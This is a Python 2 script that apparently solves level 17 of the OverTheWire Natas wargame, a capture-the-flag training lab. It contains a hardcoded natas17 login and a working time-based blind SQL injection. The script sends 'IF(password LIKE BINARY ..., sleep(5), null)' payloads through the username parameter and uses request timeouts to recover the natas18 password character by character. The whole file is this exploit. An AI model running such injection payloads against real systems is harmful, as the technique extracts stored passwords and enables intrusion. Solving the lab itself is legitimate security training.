import requests

account = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
login = account +':'+password+'@'

protocol = 'http://'
URL = account + '.natas.labs.overthewire.org/'

target = protocol+login+URL

allchars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

r = requests.get(target)

if r.status_code == requests.codes.ok:
	print 'OK'

#"""

existUsr = 'This user exists.'
used = ''

	
#"""
for c in allchars :
	try:
		r = requests.get( target + '?username=natas18" AND IF( password LIKE BINARY "%'+c+'%", sleep(5), null ) %23', timeout=1 )
	except requests.exceptions.Timeout:
		used += c
		print "Used Characters :" + used
"""
used = '047dghjlmpqsvwxyCDFIKOPR'

#"""

password = ''
while password.__len__() < 32 :
	for c in used :
		tmp = password + c
		try :
			r = requests.get( target + '?username=natas18" AND IF( password LIKE BINARY "'+ tmp +'%", sleep(5), null) %23', timeout=1 )
		except requests.exceptions.Timeout :
			password = tmp
			print "current password : " + password + '?' * (32 - password.__len__())
			break

print "END ~~"

#"""
